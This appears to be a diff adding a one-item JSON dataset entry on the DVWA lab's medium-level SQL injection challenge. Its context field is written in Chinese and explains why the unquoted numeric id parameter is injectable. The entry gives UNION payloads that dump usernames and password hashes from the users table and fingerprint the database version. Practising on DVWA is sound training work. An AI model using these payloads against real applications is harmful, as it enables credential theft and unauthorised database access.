@@ -1,0 +1,9 @@
+[
+  {
+    "id": "auto-20261030102820",
+    "context": "DVWA medium 难度 SQL Injection 关。POST 表单 id 参数，medium 源码 $id=$_POST['id'] 直接拼进 WHERE user_id=$id，数字型无引号；mysqli_real_escape_string 只作用于字符串输入所以无效。2 列回显表（First name/Surname）。",
+    "reference_payload": "POST /vulnerabilities/sqli/ body: id=1 UNION SELECT user,password FROM users&Submit=Submit  ;  指纹: id=1 UNION SELECT version(),database()&Submit=Submit",
+    "principle": "数字型注入无引号闭合 → UNION 列数对齐拖库；版本/库名指纹 version(),database()",
+    "source": "dvwa"
+  }
+]
